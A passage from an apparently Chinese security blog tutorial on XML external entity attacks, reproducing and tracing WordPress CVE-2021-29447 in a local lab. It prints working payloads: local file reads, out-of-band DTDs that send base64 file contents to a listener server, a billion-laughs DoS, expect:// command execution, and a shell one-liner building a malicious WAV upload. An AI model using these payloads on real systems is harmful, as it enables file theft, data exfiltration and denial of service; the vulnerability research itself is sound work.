</span><br><span class="hljs-meta">%dtd; ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功读取：</p><p><img src="/2023/04/27/file-upload/240514113857159.png" alt="image-20240514113857159"></p><p>第二种就是前面提到的参数实体+dtd的方式。</p><p>在第一种方法中，<code>% eval;</code> 在内部子集中定义并引用一个参数实体 <code>%file;</code>，但是很多XML解析器不允许在内部子集中引用参数实体，导致报错 <code>PEReferences forbidden in internal subset</code>。</p><p>而在第二种方法中，首先定义了几个参数实体 <code>%start;</code>、<code>%goodies;</code> 和 <code>%end;</code>。这些实体分别包含了CDATA的起始部分、从文件加载的内容，以及CDATA的结束部分。最后定义了一个外部DTD实体 <code>%dtd</code>，指向了远程的DTD文件 <code>http://ip/xxe.dtd</code>。而外部DTD文件 <code>xxe.dtd</code> 定义了一个 <code>all</code> 实体，它组合了内部子集中的 <code>start</code>、<code>goodies</code> 和 <code>end</code> 三个实体。当 <code>%dtd;</code> 被加载时，外部DTD文件的内容会被引入，使得 <code>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code> 被解析并生效。</p><p>解析顺序如下：</p><ol><li><strong>解析内部子集</strong>：<ul><li><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code></li><li><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code></li><li><code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code></li><li><code>&lt;!ENTITY % dtd SYSTEM &quot;http://23.94.98.161/xxe.dtd&quot;&gt;</code></li></ul></li><li><strong>加载外部DTD文件</strong>：<ul><li>解析器加载 <code>http://23.94.98.161/xxe.dtd</code>，该文件定义了 <code>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code>。</li></ul></li><li><strong>解析主XML内容</strong>：<ul><li><code>&lt;user&gt;&lt;username&gt;&amp;all;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></li><li><code>&amp;all;</code> 被替换为 <code>%start;%goodies;%end;</code>。</li><li><code>%start;</code> 被替换为 <code>&lt;![CDATA[</code>。</li><li><code>%goodies;</code> 被替换为文件 <code>d:/test.txt</code> 的内容。</li><li><code>%end;</code> 被替换为 <code>]]&gt;</code>。</li><li>最终替换为 <code>&lt;![CDATA[ ... ]]&gt;</code>然后解析内部的参数实体，从而正确地包含文件内容。</li></ul></li></ol><h6 id="BASE64"><a href="#BASE64" class="headerlink" title="BASE64"></a>BASE64</h6><p>xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;a;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用php伪协议即可。</p><p><img src="/2023/04/27/file-upload/240514170545290.png" alt="image-20240514170545290"></p><p>解码结果为：<br><img src="/2023/04/27/file-upload/240514170601269.png" alt="image-20240514170601269"></p><h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>无回显的情况，可以将数据发送到vps上查看。</p><p>dtd如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % test<br>&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.122.111:9999/?%file;&#x27;&gt;&quot;&gt;<br>%test;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.122.111/1.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/240515105827333.png" alt="image-20240515105827333"></p><p>将结果解码即可：</p><p><img src="/2023/04/27/file-upload/240515105850209.png" alt="image-20240515105850209"></p><p>dtd中定义了一个参数实体并对其进行引用，因为实体的值中不能有特殊字符，所以对其进行编码(%).在xml中，%dtd去访问外部dtd，dtd中引用%test，而test中定义了send，最终访问了vps，参数值即为file的内容，也就是win.ini的base64编码，通过web日志进行解码即可读取文件。</p><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>如果访问未开放端口：</p><p><img src="/2023/04/27/file-upload/240515111055017.png" alt="image-20240515111055017"></p><p>如果端口开放，结果如下：</p><p><img src="/2023/04/27/file-upload/240515111116572.png" alt="image-20240515111116572"></p><p>能够从response和响应时间判断端口开放情况。</p><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br>   <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">lolz</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol</span> <span class="hljs-string">&quot;lol&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol2</span> <span class="hljs-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol3</span> <span class="hljs-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol4</span> <span class="hljs-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol5</span> <span class="hljs-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol6</span> <span class="hljs-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol7</span> <span class="hljs-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol8</span> <span class="hljs-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol9</span> <span class="hljs-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>如果开启了expect扩展，即可直接执行命令：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://whoami&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Wordpress-CVE-2021-29447"><a href="#Wordpress-CVE-2021-29447" class="headerlink" title="Wordpress: CVE-2021-29447"></a>Wordpress: CVE-2021-29447</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Wordpress is <span class="hljs-keyword">an</span> <span class="hljs-built_in">open</span> source CMS. A user <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> ability <span class="hljs-built_in">to</span> upload <span class="hljs-built_in">files</span> (like <span class="hljs-keyword">an</span> Author) can exploit <span class="hljs-keyword">an</span> XML parsing issue <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Media Library leading <span class="hljs-built_in">to</span> XXE attacks. This requires WordPress installation <span class="hljs-built_in">to</span> be <span class="hljs-keyword">using</span> PHP <span class="hljs-number">8.</span> Access <span class="hljs-built_in">to</span> internal <span class="hljs-built_in">files</span> is possible <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> successful XXE attack. This has been patched <span class="hljs-keyword">in</span> WordPress <span class="hljs-built_in">version</span> <span class="hljs-number">5.7</span><span class="hljs-number">.1</span>, along <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> older affected versions via <span class="hljs-keyword">a</span> minor release. We strongly recommend you keep auto-updates enabled.<br></code></pre></td></tr></table></figure><p>WordPress使用了一个名为ID3的MP3解析库，该库受到XML外部实体（XXE）漏洞的影响。</p><p>能够上传文件的用户（例如Author）可以利用媒体库中的XML解析漏洞来进行XXE攻击。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="Phpstorm-phpstudy"><a href="#Phpstorm-phpstudy" class="headerlink" title="Phpstorm+phpstudy"></a>Phpstorm+phpstudy</h4><h5 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h5><ul><li>phpstudy 8.1.1.3（php8.0.2+xdebug3.0.3）</li><li>phpstorm 2024.1.1</li></ul><h5 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h5><p>phpstudy中安装扩展xdebug：</p><p><img src="/2023/04/27/file-upload/240520132525607.png" alt="image-20240520132525607"></p><p>php.ini配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/phpstudy_pro/Extensions/php/php8.<span class="hljs-number">0.2</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.colletc_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9002</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.idkey</span>=<span class="hljs-string">&quot;PHPSTORM&quot;</span><br><span class="hljs-attr">xdebug.mode</span>=debug<br></code></pre></td></tr></table></figure><p>注意这里的host，port和idkey需要跟后续phpstorm中的配置保持一致。</p><p>phpstorm配置如下。</p><p>debug port跟php.ini保持一致，可以加上9003，取消勾选force break at first line…</p><p><img src="/2023/04/27/file-upload/240520133313856.png" alt="image-20240520133313856"></p><p>DBGp Proxy中配置host，port和idekey：</p><p><img src="/2023/04/27/file-upload/240520133420767.png" alt="image-20240520133420767"></p><p>配置一个server：</p><p><img src="/2023/04/27/file-upload/240520133452570.png" alt="image-20240520133452570"></p><p>这里的port跟phpstudy中的web端口保持一致即可。</p><p>加上一个run&#x2F;debug configuration:</p><p><img src="/2023/04/27/file-upload/240520133534244.png" alt="image-20240520133534244"></p><p>最后在run选项卡下，取消勾选break at first line in PHP scripts：</p><p><img src="/2023/04/27/file-upload/240520133625958.png" alt="image-20240520133625958"></p><p>默认为选中状态，会导致在没有任何断点的情况下，直接在每个文件的第一行下断。</p><h5 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h5><p>打开监听：</p><p><img src="/2023/04/27/file-upload/240520133759361.png" alt="image-20240520133759361"></p><p>直接点击debug，在某函数处下断：</p><p><img src="/2023/04/27/file-upload/240520133836977.png" alt="image-20240520133836977"></p><p>直接运行到断点处，并且控制台中打印出了各参数值。</p><h4 id="wordpress搭建"><a href="#wordpress搭建" class="headerlink" title="wordpress搭建"></a>wordpress搭建</h4><p><a href="https://codeload.github.com/WordPress/WordPress/zip/refs/tags/5.7">https://codeload.github.com/WordPress/WordPress/zip/refs/tags/5.7</a></p><p>下载解压后，直接访问，根据提示一步步进行即可。</p><p><strong>tips:在wp-config中加上<code>define(&#39;WP_AUTO_UPDATE_CORE&#39;, false);</code>,否则在wordpress安装成功后，会自动升级版本！</strong></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在本地创建一个evil.dtd:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;<br>&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://192.168.122.1:9999/?p=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p>在linux中通过如下命令生成一个wav文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -en <span class="hljs-string">&#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;http://192.168.122.1:9999/evil.dtd&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;&gt;%remote;%init;%trick;]&gt;\x00&#x27;</span> &gt; payload.wav<br></code></pre></td></tr></table></figure><p>在evil.dtd同级目录用php开启一个server：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>在媒体板块上传payload.wav:</p><p><img src="/2023/04/27/file-upload/240521112259063.png" alt="image-20240521112259063"></p><p>查看http记录：</p><p><img src="/2023/04/27/file-upload/240521112343994.png" alt="image-20240521112343994"></p><p>base64解码：</p><p><img src="/2023/04/27/file-upload/240521112420150.png" alt="image-20240521112420150"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从公告可以看到：</p><p><a href="https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh">WordPress: Authenticated XXE attack when installation is running PHP 8 · Advisory · WordPress&#x2F;wordpress-develop (github.com)</a></p><p><img src="/2023/04/27/file-upload/240520135847575.png" alt="image-20240520135847575"></p><p>5.6-5.7版本存在漏洞，而在5.7.1进行了修复，查看一下5.7跟5.7.1版本的代码有哪些改动：</p><p><img src="/2023/04/27/file-upload/240520135949018.png" alt="image-20240520135949018"></p><p>重点看一下ID3下getid3.lib.php的内容，如果php版本小于8，就调用<code>libxml_disable_entity_loader(true)</code>，禁止加载外部实体，来防护XXE漏洞。如果php版本大于等于8，就进入到<code>$XMLobject = simplexml_load_string($XMLstring, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);</code>。</p><p><img src="/2023/04/27/file-upload/240520141420348.png" alt="image-20240520141420348"></p><p>在源码注释中写到，这个函数在 PHP 8.0 中已被弃用，因为在 libxml 2.9.0 中，默认已禁用外部实体加载，因此不再需要使用这个函数来防范 XXE 攻击。但是在simplexml_load_string()中，加上了LIBXML_NOENT选项，从而开启了实体替换。在这种情况下，外部实体将被获取并替换，最终导致XXE漏洞。</p><p>全局搜索：</p><p><img src="/2023/04/27/file-upload/240520145009840.png" alt="image-20240520145009840"></p><p>XML2array只有一处调用，跟进查看：</p><p><img src="/2023/04/27/file-upload/240520145226805.png" alt="image-20240520145226805"></p><p>XMLarray定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XML2array</span>(<span class="hljs-params"><span class="hljs-variable">$XMLstring</span></span>)</span><br></code></pre></td></tr></table></figure><p>因此，在426行处，传入的参数<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;])</code>，最终传入了simplexml_load_string()，作为$XMLstring进行解析。</p><p>下面跟一下<code>$thisfile_riff_WAVE</code></p><p>直接翻到最前面：</p><p><img src="/2023/04/27/file-upload/240520145735082.png" alt="image-20240520145735082"></p><p>往后找：</p><p><img src="/2023/04/27/file-upload/240520145812864.png" alt="image-20240520145812864"></p><p>应该是在169行这里。</p><p>而<code>$thisfile_riff_WAVE</code>被赋值为<code>$thisfile_riff[&#39;WAVE&#39;]</code>的引用，继续跟到第五十行：</p><p><img src="/2023/04/27/file-upload/240520150157047.png" alt="image-20240520150157047"></p><p>看到$info，跟进getid3:</p><p><img src="/2023/04/27/file-upload/240520154739952.png" alt="image-20240520154739952"></p><p>是getid3_riff的父类的构造方法。</p><p>下面要找到getid3_riff类在哪里进行了实例化。</p><p><img src="/2023/04/27/file-upload/240520155144849.png" alt="image-20240520155144849"></p><p>这里一共找到两处：</p><p><img src="/2023/04/27/file-upload/240521160151295.png" alt="image-20240521160151295"></p><p><img src="/2023/04/27/file-upload/240521160213958.png" alt="image-20240521160213958"></p><p>分别在Analyze和ParseRIFFdata中。</p><p>搜索ParseRIFFdata，只有一处调用，在Analyze中：</p><p><img src="/2023/04/27/file-upload/240521160301780.png" alt="image-20240521160301780"></p><p>接下来就重点找Analyze，并且是与getid3_riff类的实例化相关。</p><p>搜索Analyze，最终筛选出两处：</p><p><img src="/2023/04/27/file-upload/240522103047394.png" alt="image-20240522103047394"></p><p>这里$determined_format[‘module’]与getid3_进行了拼接，可能会拼接成getid3_riff。</p><p><img src="/2023/04/27/file-upload/240522103059153.png" alt="image-20240522103059153"></p><p>这里在Analyze上一行直接new了一个getid3_riff，同样进行了实例化，前面已经提到过，这里是在ParseRIFFdata内，而ParseRIFFdata仅仅在Analyse中被调用了一次。</p><p>因此重点看640行处的Analyze。</p><p><img src="/2023/04/27/file-upload/240522104031631.png" alt="image-20240522104031631"></p><p>要确定$class_name，就要跟$determined_format，直接看到第一处：</p><p><img src="/2023/04/27/file-upload/240522104125171.png" alt="image-20240522104125171"></p><p>继续跟GetFileFormat：</p><p><img src="/2023/04/27/file-upload/240522104253570.png" alt="image-20240522104253570"></p><p>这里首先是一个foreach的循环，从数组中取$format_name和$info，并通过后续的if判断，返回$info的值或者false。</p><p>跟进GetFileFormatArray:</p><p><img src="/2023/04/27/file-upload/240522104452348.png" alt="image-20240522104452348"></p><p>最终返回值是$format_info，而$format_info里面包含了各种文件类型，直接搜索riff：</p><p><img src="/2023/04/27/file-upload/240522104854187.png" alt="image-20240522104854187"></p><p>跟到这里可以看到，如果满足<code>(!empty($info[&#39;pattern&#39;]) &amp;&amp; preg_match(&#39;#&#39;.$info[&#39;pattern&#39;].&#39;#s&#39;, $filedata)</code>，就会把整个info返回，最终与$determined_format[‘module’]进行拼接，也就是riff，$class_name被赋值为getid3_riff，进行实例化。</p><p>确定了Analyze的位置（wp&#x2F;wp-includes&#x2F;ID3&#x2F;getid3.php:640  analyze()），继续搜索analyze：</p><p><img src="/2023/04/27/file-upload/240522105449853.png" alt="image-20240522105449853"></p><p>一共有两处调用，分别是media.php的3550行和3661行。</p><p> wp_read_video_metadata:</p><p><img src="/2023/04/27/file-upload/240522111529128.png" alt="image-20240522111529128"></p><p>wp_read_audio_metadata:</p><p><img src="/2023/04/27/file-upload/240522111600018.png" alt="image-20240522111600018"></p><p>从名称来看应该是读取视频数据。</p><p>先看wp_read_video_metadata:</p><p><img src="/2023/04/27/file-upload/240522111739564.png" alt="image-20240522111739564"></p><p>搜索到的结果都是在wp_generate_attachment_metadata函数中：</p><p><img src="/2023/04/27/file-upload/240522112752888.png" alt="image-20240522112752888"></p><p>从注释和代码可以大致判断出，该函数是用来处理image类型的文件，而前面的分析提到，如果要拼接成riff，需要audio&#x2F;wav类型的文件，而不是image，暂时跳过。</p><p>下面找wp_read_audio_metadata。</p><p>共有两处调用：</p><p><img src="/2023/04/27/file-upload/240522113014053.png" alt="image-20240522113014053"></p><p>分别在image.php和media.php，image.php的部分前面已经分析过，直接看media.php:321.</p><p><img src="/2023/04/27/file-upload/240522113214888.png" alt="image-20240522113214888"></p><p>在media_handle_upload函数内，搜索得到5处结果。</p><p>分别查看后最终定位到wp_ajax_upload_attachment函数中：</p><p><img src="/2023/04/27/file-upload/240522113553383.png" alt="image-20240522113553383"></p><p>继续跟：</p><p><img src="/2023/04/27/file-upload/240522114603126.png" alt="image-20240522114603126"></p><p>当action&#x3D;upload-attachment时，包含wp-admin&#x2F;includes&#x2F;ajax-actions.php，并调用wp_media_attachment方法，到这里已经很明显是一个上传请求，并且大致的调用链也已经清晰了，在每个调用的地方都打下断点：</p><p><img src="/2023/04/27/file-upload/240522132603456.png" alt="image-20240522132603456"></p><p>下面开始尝试debug并构造出最终payload。</p><p>最终的目的是要成功执行到<code>$XMLobject = simplexml_load_string($XMLstring, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);</code>，首先找到上传点，随便上传一个txt文件：</p><p><img src="/2023/04/27/file-upload/240522133710622.png" alt="image-20240522133710622"></p><p>action&#x3D;upload-attachment，跟前面分析的一致，并且成功断在wp_ajax_upload_attachment:</p><p><img src="/2023/04/27/file-upload/240522133825207.png" alt="image-20240522133825207"></p><p>执行到下个断点：</p><p><img src="/2023/04/27/file-upload/240522133858679.png" alt="image-20240522133858679"></p><p>到这里如果继续执行，就会直接跑完整个上传的过程，后面的断点处不会断住。</p><p>步入查看：</p><p><img src="/2023/04/27/file-upload/240522134535620.png" alt="image-20240522134535620"></p><p>如果要按照前面分析的调用链执行下去，就要使if判断的condition为真，否则就会直接跳过。</p><p>而condition中是一个$type的正则匹配，$type&#x3D;$file[‘type’]，就要弄清楚$file的值是如何得来的，在303行处打断点，步入：</p><p><img src="/2023/04/27/file-upload/240522134904962.png" alt="image-20240522134904962"></p><p>继续下断点，步入：</p><p><img src="/2023/04/27/file-upload/240522135140870.png" alt="image-20240522135140870"></p><p>在_wp_handle_upload函数中，通过wp_check_filetype_and_ext来给$ext,$type等赋值，步入880行：</p><p><img src="/2023/04/27/file-upload/240522135433021.png" alt="image-20240522135433021"></p><p>wp_check_filetype，继续步入：</p><p><img src="/2023/04/27/file-upload/240522135535787.png" alt="image-20240522135535787"></p><p>这里的逻辑很清晰，就是给出一个mime白名单，对于白名单里的内容，通过foreach进行后缀名匹配。</p><p><img src="/2023/04/27/file-upload/240522135738827.png" alt="image-20240522135738827"></p><p>匹配上了txt，$type&#x3D;text&#x2F;plain,$ext&#x3D;txt.</p><p>跳回到wp_check_filetype_and_ext()：</p><p><img src="/2023/04/27/file-upload/240522144223931.png" alt="image-20240522144223931"></p><p>调用finfo_file，finfo_file通过magic number进行MIME格式判断。并且后续会同时比较$real_mime和$type，如果服务器能匹配上，并且在白名单中，就给一个type的值，否则为false。</p><p><img src="/2023/04/27/file-upload/240522150247571.png" alt="image-20240522150247571"></p><p>回到前面的匹配条件，需要满足<code>preg_match( &#39;#^audio#&#39;, $type )</code>，到wp_check_filetype()中查看白名单内容，搜索audio：</p><p><img src="/2023/04/27/file-upload/240522150646485.png" alt="image-20240522150646485"></p><p>共找到10种后缀类型。</p><p>将txt后缀改为mp3，尝试过type检测：</p><p><img src="/2023/04/27/file-upload/240522152708094.png" alt="image-20240522152708094"></p><p>通过后缀匹配到type为audio&#x2F;mpeg，但是通过finfo_file检测到MIME为text&#x2F;plain，不一致，最终赋值为false，后续代码不能继续执行。</p><p>直接复制某mp3文件的文件头，复制16位，重新上传：</p><p><img src="/2023/04/27/file-upload/240522155324014.png" alt="image-20240522155324014"></p><p><img src="/2023/04/27/file-upload/240522155253241.png" alt="image-20240522155253241"></p><p><img src="/2023/04/27/file-upload/240522155349526.png" alt="image-20240522155349526"></p><p>type为autio&#x2F;mpeg，成功执行wp_read_audio_metadata(),步入：</p><p><img src="/2023/04/27/file-upload/240522155439570.png" alt="image-20240522155439570"></p><p>成功执行到下一个断点，继续步入，跟到analyze():</p><p><img src="/2023/04/27/file-upload/240522155528985.png" alt="image-20240522155528985"></p><p>至此，已经到了getID3类中，如果要继续执行，就要满足$determined_format[‘module’]为riff。</p><p>先继续往下执行代码查看：</p><p><img src="/2023/04/27/file-upload/240522160356553.png" alt="image-20240522160356553"></p><p>到实例化这一步，$class_name为getid3_mp3，在GetFileFormat()这一步，给$determined_format赋值为mp3，而不是riff。</p><p>接下来针对这一点继续分析。</p><p><img src="/2023/04/27/file-upload/240522162251378.png" alt="image-20240522162251378"></p><p>要满足<code>GetFileFormat($formattest, ($original_filename ? $original_filename : $filename));</code>为riff，就要保证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 